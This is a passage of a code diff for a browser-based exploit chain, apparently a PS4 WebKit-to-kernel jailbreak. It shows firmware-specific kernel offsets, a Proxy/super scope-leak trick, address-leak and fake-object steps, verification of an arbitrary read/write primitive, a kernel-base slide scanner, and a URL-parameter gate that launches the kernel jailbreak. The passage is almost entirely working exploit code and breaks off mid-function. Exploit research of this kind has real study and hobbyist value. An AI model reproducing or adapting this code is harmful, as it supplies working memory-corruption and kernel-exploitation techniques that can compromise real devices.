-    "13.50": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538, allprocMx: 0x2485EF0 },
-    "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31, allproc: 0x1B28538, allprocMx: 0x2485EF0 }
+    "13.00": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
+    "13.02": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
+    "13.04": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
+    "13.50": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
+    "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 }
 };
 
-function firmwareJmpOffset() {
-    var raw = Q.get("jmp");
-    if (raw) {
-        var j = parseInt(String(raw).replace(/^0x/i, ""), 16);
-        if (isFinite(j) && j > 0) return j;
-    }
-    return fwOffsets.jmp;
-}
-
 // ========== PARAMETERS ==========
+var Q = new URLSearchParams(location.search);
+var requestedDrain = parseInt(Q.get("n") || "128", 10);
+var DRAIN_COUNT = isFinite(requestedDrain) ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
 var LITE = Q.get("l") === "1";
 
-var attemptNumber = 0;
+/* ------------------------------------------------------------------
+ *  JAILBREAK GATE
+ *  By default we STOP as soon as the R/W primitive passes.
+ *  Add ?jb=1 to the URL to actually run the kernel jailbreak.
+ *  This prevents the crash/reload loop caused by runJailbreak().
+ * ------------------------------------------------------------------ */
+var RUN_JAILBREAK = Q.get("jb") === "1";
+var JB_DELAY_MS = (function(){
+    var v = parseInt(Q.get("jbdelay") || "7500", 10);
+    if (!isFinite(v)) v = 7500;
+    return Math.max(500, Math.min(30000, v));
+})();
+var SURVIVE_MS = (function(){
+    var parts = (Q.get("sv") || "100,3500,7000").split(",");
+    var t100 = parseInt(parts[0], 10), t1k = parseInt(parts[1], 10), t3k = parseInt(parts[2], 10);
+    if (!isFinite(t100)) t100 = 100;
+    if (!isFinite(t1k)) t1k = 3500;
+    if (!isFinite(t3k)) t3k = 7000;
+    return { t100: t100, t1k: t1k, t3k: t3k };
+})();
+var FORCE_UCRED_SIG_SCAN = Q.get("ksig") === "1";
+
+var REVISION = "genuine-u8-rw-20-1352";
 var K = 2;
 var DUPLICATE_INDEX = 2;
 var CONTROL_INDEX = 0xffff;
@@ -416,6 +536,12 @@ var FILLER_OBJECTS = 0xfffe - K;
 var EXPECTED_LENGTH = 0x50001;
 var CELL_BYTES = 0x30;
 
+var CARRIER_SLOTS = (function(){
+    var v = parseInt(Q.get("c") || "800000", 10);
+    if (!isFinite(v)) v = 800000;
+    return Math.max(100000, Math.min(4500000, v));
+})();
+var CARRIER_BYTES = CARRIER_SLOTS * 8;
 var CAPTURE_DELAY_MS = 3000;
 var COMPOSE_DELAY_MS = 6500;
 var symbolToString = Symbol.prototype.toString;
@@ -497,17 +623,28 @@ var FW_LABEL = (function() {
 var fwOffsets = PS4_OFFSETS[FW_LABEL] || PS4_OFFSETS[""];
 
 // ========== UTILITY ==========
-function hex(value) { return "0x" + value.toString(16); }
+function mark(tag, extra) {
+    if (!headerPrinted) printHeader();
+    seq++;
+    var line = seq + "-rw-" + tag + (extra !== undefined ? "-" + extra : "");
+    var level = classify(tag, extra);
+    logLine(line, level);
+    try { updateStatusFromMark(tag, extra); } catch (_) {}
+}
+
+function hex(value) {
+    return "0x" + value.toString(16);
+}
+
+var KBASE_DEFAULT = 0xffffffff80000000n;
 
 function kptrBig(v) {
     var b = typeof v === "bigint" ? v : BigInt(v);
     return b > 0xffffffff00000000n && b < 0xffffffffffff0000n;
 }
 
-var KBASE_DEFAULT = 0xffffffff80000000n;
-var KBASE_SLIDE_MAX = 0x4000000n;
-
-function parseKernelBaseString(raw) {
+function kernelBaseFromQuery() {
+    var raw = Q.get("kb");
     if (!raw) return null;
     raw = String(raw).trim().toLowerCase();
     if (raw.indexOf("0x") === 0) raw = raw.slice(2);
@@ -518,311 +655,239 @@ function parseKernelBaseString(raw) {
     return null;
 }
 
-function kernelBaseFromQuery() {
-    var b = parseKernelBaseString(Q.get("kb"));
-    return b !== null ? b : KBASE_DEFAULT;
+var KBASE_LINK_BASES = [0xffffffff80200000n, 0xffffffff82200000n];
+var KBASE_SLIDE_STEP = 0x200000n;
+var KBASE_SLIDE_MAX  = 0x1000000n;
+var KBASE_SCAN_CHUNK = 8;
+
+function parseHexBig(raw, fallback) {
+    if (raw == null || raw === "") return fallback;
+    raw = String(raw).trim().toLowerCase();
+    if (raw.indexOf("0x") === 0) raw = raw.slice(2);
+    try { return BigInt("0x" + raw); } catch (_) {}
+    return fallback;
 }
 
-function kernelBaseFromStorage() {
-    var keys = ["ps4lab_kernel_base", "wk-kernelBase", "jb-kernel-base"];
-    for (var i = 0; i < keys.length; i++) {
-        try {
-            var v = localStorage.getItem(keys[i]) || sessionStorage.getItem(keys[i]);
-            var b = parseKernelBaseString(v);
-            if (b !== null) return b;
-        } catch (_) {}
+function kbaseScanConfig() {
+    var step = parseHexBig(Q.get("kbstep"), KBASE_SLIDE_STEP);
+    var maxSlide = parseHexBig(Q.get("kbmax"), KBASE_SLIDE_MAX);
+    var chunk = parseInt(Q.get("kbchunk") || String(KBASE_SCAN_CHUNK), 10);
+    if (!isFinite(chunk) || chunk < 1) chunk = KBASE_SCAN_CHUNK;
+    chunk = Math.min(32, chunk);
+    var links = KBASE_LINK_BASES.slice();
+    var rawLinks = Q.get("kblinks");
+    if (rawLinks) {
+        links = [];
+        rawLinks.split(",").forEach(function (part) {
+            var b = parseHexBig(part.trim(), null);
+            if (b != null && kptrBig(b)) links.push(b);
+        });
+        if (!links.length) links = KBASE_LINK_BASES.slice();
     }
-    return null;
+    return { links: links, step: step, maxSlide: maxSlide, chunk: chunk };
 }
 
-function probeKernelBase(kbase, sysentOff, prison0Off) {
-    try {
-        if (!probeKernelBaseLoose(kbase, sysentOff)) return false;
-        var pr = read64(kbase + BigInt(prison0Off));
-        return kptrBig(pr);
-    } catch (_) {
-        return false;
+function kbaseCandidateValid(base) {
+    if (!fwOffsets || fwOffsets.prison0 == null || fwOffsets.sysent == null) return false;
+    if (!kptrBig(base)) return false;
+    var prison0Off = BigInt(fwOffsets.prison0);
+    var sysentOff = BigInt(fwOffsets.sysent);
+    var rootOff = fwOffsets.rootvnode != null ? BigInt(fwOffsets.rootvnode) : null;
+
+    var prison = read64(base + prison0Off);
+    if (!kptrBig(prison)) return false;
+
+    var sysent = base + sysentOff;
+    var syNarg = read64(sysent) & 0xffn;
+    if (syNarg > 14n) return false;
+    var syCall = read64(sysent + 8n);
+    if (!kptrBig(syCall)) return false;
+    if (syCall < base || syCall > base + 0x3000000n) return false;
+    var syThr = read64(sysent + 0x2cn) & 0xffffffffn;
+    if (syThr > 0x100000n) return false;
+
+    if (rootOff != null) {
+        var root = read64(base + rootOff);
+        if (!kptrBig(root)) return false;
     }
+
+    var jmpOff = BigInt(firmwareJmpOffset());
+    var jmpTarget = base + jmpOff;
+    if (!kptrBig(jmpTarget)) return false;
+
+    return true;
 }
 
-function probeKernelBaseLoose(kbase, sysentOff) {
-    return probeSysent661LooseAt(kbase + BigInt(sysentOff), kbase);
-}
-
-function probeSysent661LooseAt(seAddr, kbaseHint) {
-    try {
-        var se = BigInt(seAddr);
-        var narg = read64(se) & 0xFFFFFFFFn;
-        if (narg > 12n) return false;
-        var call = read64(se + 8n);
-        if (!kptrBig(call)) return false;
-        if (kbaseHint !== null && kbaseHint !== undefined) {
-            var kb = BigInt(kbaseHint);
-            if (call < kb || call > kb + 0x4000000n) return false;
-        } else if (call < 0xffffffff80000000n) return false;
-        var thr = read64(se + 0x2Cn) & 0xFFFFFFFFn;
-        return thr <= 0x100000n;
-    } catch (_) {
-        return false;
-    }
-}
-
-function deriveKbaseFromSysentVa(seAddr, sysentOff) {
-    return BigInt(seAddr) - BigInt(sysentOff);
-}
-
-function findSysent661Absolute(sysentOff, prison0Off) {
-    var sysentBig = BigInt(sysentOff);
-    var scanStart = KBASE_DEFAULT + sysentBig;
-    var scanEnd = KBASE_DEFAULT + sysentBig + KBASE_SLIDE_MAX;
-    var step = 0x4000n;
-    var best = null;
-    for (var se = scanStart; se < scanEnd; se += step) {
-        var kb = se - sysentBig;
-        if (probeSysent661LooseAt(se, kb)) {
-            var strict = false;
-            try {
-                var pr = read64(kb + BigInt(prison0Off));
-                strict = kptrBig(pr);
-            } catch (_) {}
-            var hit = { se: se, kb: kb, strict: strict, loose: true };
-            mark("SYSENT-VA-HIT", "se=" + hex(se) + "-kb-derived=" + hex(kb) + "-strict=" + strict);
-            return hit;
-        }
-    }
-    var offSlack = 0x80000n;
-    for (var delta = -offSlack; delta <= offSlack; delta += 0x10000n) {
-        var se2 = scanStart + delta;
-        var kb2 = se2 - sysentBig;
-        if (probeSysent661LooseAt(se2, kb2)) {
-            mark("SYSENT-VA-HIT", "se=" + hex(se2) + "-kb-derived=" + hex(kb2) + "-off-delta=" + hex(delta));
-            return { se: se2, kb: kb2, strict: false, loose: true };
-        }
-    }
-    return best;
-}
-
-function sampleKernelReads(sysentOff) {
-    var samples = [];
-    function add(tag, addr) {
-        try {
-            var v = read64(addr);
-            samples.push(tag + "=" + hex(v));
-        } catch (e) {
-            samples.push(tag + "=err");
-        }
-    }
-    if (isFinite(hostAddress)) add("user-host", BigInt(Math.floor(hostAddress)));
-    if (isFinite(targetAddress)) add("user-target", BigInt(Math.floor(targetAddress)));
-    var se0 = KBASE_DEFAULT + BigInt(sysentOff);
-    add("kern-se-default", se0);
-    add("kern-se+slide1m", se0 + 0x100000n);
-    add("kern-se+slide2m", se0 + 0x200000n);
-    mark("KERNEL-READ-SAMPLES", samples.join("-"));
-    return samples;
-}
-
-function markSysentProbeAt(seAddr, kbaseForTag) {
-    try {
-        var se = BigInt(seAddr);
-        var narg = read64(se) & 0xFFFFFFFFn;
-        var call = read64(se + 8n);
-        var kb = kbaseForTag !== undefined ? BigInt(kbaseForTag) : deriveKbaseFromSysentVa(se, fwOffsets.sysent);
-        mark("SYSENT-PROBE", "se=" + hex(se) + "-narg=" + narg + "-call=" + hex(call) + "-loose=" + probeSysent661LooseAt(se, kb));
-    } catch (e) {
-        mark("SYSENT-PROBE", "err=" + e.message);
-    }
-}
-
-function markSysentProbe(kbase, sysentOff) {
-    markSysentProbeAt(kbase + BigInt(sysentOff), kbase);
-}
-
-function enumerateAllproc(kbase, allprocOff, max) {
-    var out = [];
-    if (!allprocOff) return out;
-    var seen = Object.create(null);
-    function walkFrom(cur) {
-        if (!kptrBig(cur) || seen[cur.toString(16)]) return;
-        var head = cur;
-        for (var i = 0; i < max; i++) {
-            var key = cur.toString(16);
-            if (seen[key]) break;
-            seen[key] = 1;
-            out.push(cur);
-            var next = read64(cur);
-            if (!kptrBig(next) || next === cur) break;
-            if ((next & 0xFFFFF00000000000n) !== 0xFFFFFFFF00000000n) break;
-            cur = next;
-            if (cur === head) break;
-        }
-    }
-    try {
-        var slot = kbase + BigInt(allprocOff);
-        var p0 = read64(slot);
-        walkFrom(p0);
-        if (kptrBig(p0)) walkFrom(read64(p0));
-    } catch (_) {}
-    return out;
-}
-
-function finishKbaseResolve(kb, sysentOff, prison0Off, tag) {
-    var strict = probeKernelBase(kb, sysentOff, prison0Off);
-    var loose = probeKernelBaseLoose(kb, sysentOff);
-    mark("KBASE-FOUND", hex(kb) + "-" + tag + "-loose=" + loose + "-strict=" + strict);
-    return { kb: kb, strict: strict, loose: loose };
-}
-
-function persistKernelBase(kb) {
-    if (!kptrBig(kb)) return;
-    var s = "0x" + kb.toString(16);
-    try { localStorage.setItem("ps4lab_kernel_base", s); } catch (_) {}
-    try { sessionStorage.setItem("ps4lab_kernel_base", s); } catch (_) {}
-}
-
-function metaFromSysentHit(hit, tag) {
-    if (!hit) return null;
-    var r = finishKbaseResolve(hit.kb, fwOffsets.sysent, fwOffsets.prison0, tag + "-se=" + hex(hit.se));
-    return { kb: hit.kb, se: hit.se, located: true, loose: r.loose, strict: r.strict || hit.strict };
-}
-
-function resolveKernelBaseSync(sysentOff, prison0Off, done) {
-    if (Q.get("kb")) {
-        mark("KBASE-SRC", "query");
-        var qkb = kernelBaseFromQuery();
-        var r = finishKbaseResolve(qkb, sysentOff, prison0Off, "query");
-        done({ kb: r.kb, se: qkb + BigInt(sysentOff), located: r.loose || r.strict, loose: r.loose, strict: r.strict });
+function resolveKbaseAsync(done) {
+    var manual = kernelBaseFromQuery();
+    if (manual != null) {
+        mark("KBASE-SCAN-SKIP", "kb-query");
+        done(manual);
         return;
     }
-    var stored = kernelBaseFromStorage();
-    if (stored !== null && probeKernelBaseLoose(stored, sysentOff)) {
-        mark("KBASE-SRC", "storage");
-        var rs = finishKbaseResolve(stored, sysentOff, prison0Off, "storage");
-        done({ kb: rs.kb, se: stored + BigInt(sysentOff), located: true, loose: rs.loose, strict: rs.strict });
+    if (Q.get("kbscan") === "0") {
+        mark("KBASE-SCAN-SKIP", "kbscan=0-default");
+        done(KBASE_DEFAULT);
         return;
     }
-    mark("KBASE-SRC", "sysent-va-scan-no-prior-kbase");
-    var hit = findSysent661Absolute(sysentOff, prison0Off);
-    if (hit) {
-        var m = metaFromSysentHit(hit, "sysent-va");
-        done(m);
+    if (!fwOffsets || fwOffsets.prison0 == null) {
+        mark("KBASE-SCAN-SKIP", "no-fw-offsets");
+        done(KBASE_DEFAULT);
         return;
     }
-    mark("KBASE-FOUND", "none");
-    markSysentProbeAt(KBASE_DEFAULT + BigInt(sysentOff), KBASE_DEFAULT);
-    done({ kb: KBASE_DEFAULT, se: KBASE_DEFAULT + BigInt(sysentOff), located: false, loose: false, strict: false });
-}
 
-function resolveKernelBaseForStage(sysentOff, prison0Off, done) {
-    if (Q.get("kbase") === "sync" || KERNEL_LAB) resolveKernelBaseSync(sysentOff, prison0Off, done);
-    else resolveKernelBaseAsync(sysentOff, prison0Off, done);
-}
-
-function resolveKernelBaseAsync(sysentOff, prison0Off, done) {
-    function finishLocated(kb, tag) {
-        var r = finishKbaseResolve(kb, sysentOff, prison0Off, tag);
-        done({ kb: r.kb, located: true, loose: r.loose, strict: r.strict });
-    }
-    if (Q.get("kb")) {
-        mark("KBASE-SRC", "query");
-        finishLocated(kernelBaseFromQuery(), "query");
-        return;
-    }
-    var stored = kernelBaseFromStorage();
-    if (stored !== null && probeKernelBaseLoose(stored, sysentOff)) {
-        mark("KBASE-SRC", "storage");
-        finishLocated(stored, "storage");
-        return;
-    }
-    if (probeKernelBaseLoose(KBASE_DEFAULT, sysentOff)) {
-        mark("KBASE-SRC", "default-loose");
-        finishLocated(KBASE_DEFAULT, "default");
-        return;
-    }
-    mark("KBASE-SRC", "slide-scan-loose");
+    var cfg = kbaseScanConfig();
+    var dbgMode = Q.get("dbg") === "1";
+    var linkIdx = 0;
     var slide = 0n;
-    function chunk() {
-        var end = slide + 0x100000n;
-        if (end > KBASE_SLIDE_MAX) end = KBASE_SLIDE_MAX;
-        for (; slide < end; slide += 0x4000n) {
-            var kb = KBASE_DEFAULT + slide;
-            if (probeKernelBaseLoose(kb, sysentOff)) {
-                finishLocated(kb, "slide=" + hex(slide));
-                return;
-            }
-        }
-        if (slide < KBASE_SLIDE_MAX) setTimeout(chunk, 0);
-        else {
-            mark("KBASE-SRC", "sysent-va-scan-fallback");
-            var hit = findSysent661Absolute(sysentOff, prison0Off);
-            if (hit) {
-                var m = metaFromSysentHit(hit, "sysent-va-async");
-                done(m);
-                return;
-            }
-            mark("KBASE-FOUND", "none");
-            mark("KBASE-WARN", "sysent-VA-scan-missed-check-KERNEL-READ-SAMPLES");
-            markSysentProbeAt(KBASE_DEFAULT + BigInt(sysentOff), KBASE_DEFAULT);
-            done({ kb: KBASE_DEFAULT, se: KBASE_DEFAULT + BigInt(sysentOff), located: false, loose: false, strict: false });
-        }
-    }
-    setTimeout(chunk, 0);
-}
+    var tested = 0;
 
-function harvestKernelPtrsNearHost() {
-    var out = [];
-    if (!isFinite(hostAddress) || !plausibleCell(hostAddress)) return out;
-    var center = BigInt(Math.floor(hostAddress));
-    var span = 0x80000n;
-    var seen = Object.create(null);
-    for (var delta = -span; delta <= span; delta += 8n) {
+    mark("KBASE-SCAN-BEGIN", "links=" + cfg.links.length + "-step=" + hex(cfg.step));
+
+    function tick() {
         try {
-            var p = read64(center + delta);
-            if (!kptrBig(p)) continue;
-            var key = p.toString(16);
-            if (seen[key]) continue;
-            seen[key] = 1;
-            out.push(p);
-            if (out.length >= 48) break;
-        } catch (_) {}
+            var batch = 0;
+            while (batch < cfg.chunk && linkIdx < cfg.links.length) {
+                var base = cfg.links[linkIdx] + slide;
+                tested++;
+                if (kbaseCandidateValid(base)) {
+                    mark("KBASE-SCAN-HIT", hex(base) + "-tested=" + tested);
+                    done(base);
+                    return;
+                }
+                if (dbgMode && (tested % 64 === 0)) {
+                    mark("KBASE-SCAN-PROGRESS", "t=" + tested + "-at=" + hex(base));
+                }
+                slide += cfg.step;
+                if (slide > cfg.maxSlide) {
+                    linkIdx++;
+                    slide = 0n;
+                }
+                batch++;
+            }
+            if (linkIdx >= cfg.links.length) {
+                mark("KBASE-SCAN-FAIL", "tested=" + tested);
+                done(null);
+                return;
+            }
+            setTimeout(tick, 0);
+        } catch (error) {
+            mark("KBASE-SCAN-ERR", error.message);
+            done(null);
+        }
     }
-    return out;
+    setTimeout(tick, 0);
 }
 
-function buildProcCandidates(kbase, evfOff, harvested) {
-    var out = [];
-    var seen = Object.create(null);
-    function add(v) {
-        if (!kptrBig(v)) return;
-        var key = v.toString(16);
-        if (seen[key]) return;
-        seen[key] = 1;
-        out.push(v);
-    }
-    if (harvested) {
-        for (var h = 0; h < harvested.length; h++) add(harvested[h]);
-    }
-    var sym = kbase + BigInt(evfOff);
-    add(sym);
-    try { add(read64(sym)); } catch (_) {}
-    try { add(read64(kbase + BigInt(evfOff))); } catch (_) {}
-    try {
-        var p0 = read64(kbase + BigInt(evfOff));
-        if (kptrBig(p0)) add(read64(p0));
-    } catch (_) {}
-    return out;
+function scheduleKernelJailbreak() {
+    resolveKbaseAsync(function (kbase) {
+        if (kbase == null) {
+            mark("JAILBREAK-ABORT", "no-valid-kbase");
+            maybeAutoSave();
+            return;
+        }
+        runJailbreak(kbase);
+    });
 }
-function buffer(size) { return new ArrayBuffer(size); }
+
+function firmwareJmpOffset() {
+    var raw = Q.get("jmp");
+    if (raw) {
+        var j = parseInt(String(raw).replace(/^0x/i, ""), 16);
+        if (isFinite(j) && j > 0) return j;
+    }
+    return fwOffsets.jmp;
+}
+
+function compactLog(keep) {
+    keep = keep || 80;
+    while (LOG.lines.length > keep) LOG.lines.shift();
+    try {
+        var el = document.getElementById("out");
+        if (el) while (el.childNodes.length > keep) el.removeChild(el.firstChild);
+        updateChips();
+    } catch (_) {}
+}
+
+function dropFillerGraphBatched() {
+    var graph = fillerGraph;
+    fillerGraph = null;
+    outerGraph = null;
+    if (!graph) return;
+    var batch = 4096;
+    var idx = 0;
+    function step() {
+        if (!graph) return;
+        var end = Math.min(idx + batch, graph.length);
+        for (var i = idx; i < end; i++) graph[i] = null;
+        idx = end;
+        if (idx < graph.length) setTimeout(step, 0);
+        else {
+            graph.length = 0;
+            graph = null;
+            mark("FILLER-FREED", "batched");
+        }
+    }
+    setTimeout(step, 0);
+}
+
+function dropCarrierBatched() {
+    var carrier = getterCarrier;
+    getterCarrier = null;
+    if (!carrier) return;
+    var batch = 12000;
+    var idx = 0;
+    function step() {
+        if (!carrier) return;
+        var end = Math.min(idx + batch, CARRIER_SLOTS);
+        for (var i = idx; i < end; i++) {
+            try { delete carrier[i]; } catch (_) {}
+        }
+        idx = end;
+        if (idx < CARRIER_SLOTS) setTimeout(step, 20);
+        else {
+            carrier = null;
+            mark("CARRIER-FREED", "slots=" + CARRIER_SLOTS);
+        }
+    }
+    setTimeout(step, 80);
+}
+
+function releasePreJailbreakMemory() {
+    try { history.replaceState(null, ""); } catch (_) {}
+    referenceTarget = null;
+    preparedSymbolObject = null;
+    capturedString = null;
+    capturedWords = null;
+    leakedScope = null;
+    predecessorWords = null;
+    rwHeader = null;
+    targetHeader = null;
+    for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
+    keepIndex = 0;
+    compactLog(80);
+    dropFillerGraphBatched();
+    dropCarrierBatched();
+    mark("MEM-RELEASE", "staggered-drop-scheduled");
+}
+
+function buffer(size) {
+    return new ArrayBuffer(size);
+}
+
 function uint32At(bytes, offset) {
     return bytes[offset] + bytes[offset+1]*0x100 + bytes[offset+2]*0x10000 + bytes[offset+3]*0x1000000;
 }
+
 function plausibleCell(value) {
     return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991 && Math.floor(value) === value && value % 8 === 0;
 }
+
 function pointerFromWords(words, offset) {
     if (words[offset+3] !== 0) return NaN;
     return words[offset] + words[offset+1]*0x10000 + words[offset+2]*0x100000000;
 }
+
 function encodedHeaderNumber() {
     var raw = new ArrayBuffer(8);
     var u32 = new Uint32Array(raw);
@@ -831,6 +896,7 @@ function encodedHeaderNumber() {
     u32[1] = 0x01062800;
     return f64[0];
 }
+
 function leakScopeObject() {
     class Leaker { leak() { return super.foo; } }
     Leaker.prototype.__proto__ = new Proxy({}, {
@@ -839,6 +905,7 @@ function leakScopeObject() {
     var leak = Leaker.prototype.leak;
     return (function() { return leak(); })();
 }
+
 function prepareSymbolWrapper(F) {
     leakedScope = leakScopeObject();
     if (leakedScope === undefined || leakedScope === null) throw new Error("scope-not-leaked");
@@ -846,6 +913,13 @@ function prepareSymbolWrapper(F) {
     for (var j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
     Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
     return Object(leakedScope.g);
+}
+
+/* Single terminal failure reporter */
+function failTerminal(reason, detail) {
+    attemptSucceeded = false;
+    mark("FAILED-TERMINAL", "reason=" + reason + (detail ? "-" + detail : ""));
+    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
 }
 
 // ========== EXPLOIT CORE ==========
@@ -1109,9 +1183,8 @@ function reportComposition() {
     if (compositionState < 0) {
         mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW", (compositionError && compositionError.name) + ":" + String(compositionError && compositionError.message).slice(0, 80));
         mark("DONE-THROW", "predecessor-cleared=true");
-        if (!retrySafe) { try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {} }
         setTimeout(function() { mark("SURVIVED-THROW-T1000"); }, 1000);
-        scheduleRetry(retrySafe ? "placement-miss" : "load-threw");
+        failTerminal(retrySafe ? "placement-miss" : "load-threw");
         return;
     }
 
@@ -1119,7 +1192,7 @@ function reportComposition() {
         mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
         mark("DONE-MISS", "predecessor-cleared=true");
         setTimeout(function() { mark("SURVIVED-MISS-T1000"); }, 1000);
-        scheduleRetry("clone-miss");
+        failTerminal("clone-miss");
         return;
     }
 
@@ -1127,25 +1200,22 @@ function reportComposition() {
         mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK + "-carrier-restored=true");
         mark("RW-HEADER-HEX", dumpHex(rwHeader));
         mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
-        if (!retrySafe) { try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {} }
         setTimeout(function() { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
-        scheduleRetry("header-mismatch");
+        failTerminal("header-mismatch");
         return;
     }
 
     if (compositionState === 0) {
         mark("NO-RESULT", "critical-load-did-not-finish");
-        scheduleRetry("no-result");
+        failTerminal("no-result");
         return;
     }
 
     mark("SSV-RETURNED-CLEARED", "length=" + compositionLength + "-predecessor-cleared=true");
     mark("RW-CARRIER", "slid=" + hex(uint32At(rwHeader, 0)) + "-vendor=" + hex(rwOriginalVector) + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
     mark("TARGET-CELL", "P=" + hex(targetAddress) + "-slid=" + hex(uint32At(targetHeader, 0)) + "-length=0x100-mode=0x" + targetHeader[0x28].toString(16));
-    if (Q.get("hex") === "1" || !RUN_KERNEL_STAGE) {
-        mark("RW-HEADER-HEX", dumpHex(rwHeader));
-        mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
-    }
+    mark("RW-HEADER-HEX", dumpHex(rwHeader));
+    mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
 
     var readPass = rwHeaderOK && targetHeaderOK && readObserved && compositionLength === EXPECTED_LENGTH;
     var writePass = writeObserved && restoreObserved;
@@ -1160,68 +1230,32 @@ function reportComposition() {
         attemptSucceeded = true;
         mark("GENUINE-UB-RW-PASS", "carrier-vector-restored=true");
         try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
+        releasePreJailbreakMemory();
 
-        function markRootsLive() {
-            try {
-                mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
-            } catch (e) {
-                mark("ROOTS-LIVE", "err=" + (e && e.message));
-            }
-            scheduleSurvivalMarks();
-        }
-
-        function scheduleKernelStage() {
-            compactLog(12);
-            setTimeout(function() {
-                try {
-                    if (KERNEL_LAB) {
-                        mark("JAILBREAK-GATE", "klab");
-                        setTimeout(runKernelLab, JB_DELAY_MS);
-                    } else if (!RUN_JAILBREAK) {
-                        mark("HALTED-BEFORE-JAILBREAK", "rw-primitive-ready-no-kernel-writes-performed");
-                        mark("HALT-NOTE", "append-?jb=1-to-url-to-run-kernel-jailbreak-or-klab=1");
-                    } else {
-                        mark("JAILBREAK-GATE", "pause=" + JB_GATE_PAUSE_MS + "-jb-delay=" + JB_DELAY_MS);
-                        setTimeout(runJailbreak, JB_DELAY_MS);
-                    }
-                } catch (e) {
-                    mark("JAILBREAK-GATE", "err=" + (e && e.message));
-                }
-            }, JB_GATE_PAUSE_MS);
-        }
-
-        function afterRwPassReady() {
-            markRootsLive();
-            if (!testRun) {
-                testRun = true;
-                scheduleKernelStage();
-            }
-        }
-
+        /* HALT unless ?jb=1 — retail: batched heap drop before kernel */
         if (!testRun) {
-            if (RUN_KERNEL_STAGE) {
-                releasePostRwGroomOnly();
-                if (SIMPLE_JB) {
-                    setTimeout(afterRwPassReady, 50);
-                } else {
-                    trimCarrierTailBatched(afterRwPassReady);
-                }
+            testRun = true;
+            if (RUN_JAILBREAK) {
+                mark("JAILBREAK-GATE", "explicitly-enabled-by-url-param");
+                setTimeout(scheduleKernelJailbreak, JB_DELAY_MS);
             } else {
-                if (MEM_DROP_AFTER_RW) releasePreJailbreakMemory();
-                afterRwPassReady();
+                mark("HALTED-BEFORE-JAILBREAK", "rw-primitive-ready-no-kernel-writes-performed");
+                mark("HALT-NOTE", "append-?jb=1-to-url-to-run-kernel-jailbreak");
+                setStatus("halted", "R/W PASS — HALTED", "kernel jailbreak skipped (add ?jb=1 to run)");
+                maybeAutoSave();
             }
-        } else {
-            markRootsLive();
         }
     } else {
-        try {
-            mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
-        } catch (e) {
-            mark("ROOTS-LIVE", "err=" + (e && e.message));
-        }
+        failTerminal("rw-verify-miss", "read=" + readPass + "-write=" + writePass);
     }
 
-    if (!attemptSucceeded) scheduleRetry("rw-verify-miss");
+    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
+    if (readPass && writePass) {
+        var sv = SURVIVE_MS;
+        setTimeout(function() { mark("SURVIVED-T100"); }, sv.t100);
+        setTimeout(function() { mark("SURVIVED-T1000"); }, sv.t1k);
+        setTimeout(function() { mark("SURVIVED-T3000"); }, sv.t3k);
+    }
 }
 
 function runGroomAndLoad() {
@@ -1264,12 +1298,12 @@ function runGroomAndLoad() {
 function beginComposition() {
     if (captureState === 0) {
         mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
-        scheduleRetry("addrof-no-result");
+        failTerminal("addrof-no-result");
         return;
     }
     if (captureState < 0) {
         mark("ADDROF-THREW", (captureError && captureError.name) + ":" + String(captureError && captureError.message).slice(0, 80));
-        scheduleRetry("addrof-threw");
+        failTerminal("addrof-threw");
         return;
     }
 
@@ -1289,7 +1323,7 @@ function beginComposition() {
 
     if (!(repeated && distinct && plausible && sourceCovered)) {
         mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct + "-plausible=" + plausible + "-covered=" + sourceCovered);
-        scheduleRetry("addrof-fail");
+        failTerminal("addrof-fail");
         return;
     }
 
@@ -1299,166 +1333,17 @@ function beginComposition() {
     targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
     if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 || targetAddressLow > 0xffffffff || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
         mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
-        scheduleRetry("target-addr-fail");
+        failTerminal("target-addr-fail");
         return;
     }
     fakeAddress = hostAddress + 0x10;
     if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
         mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
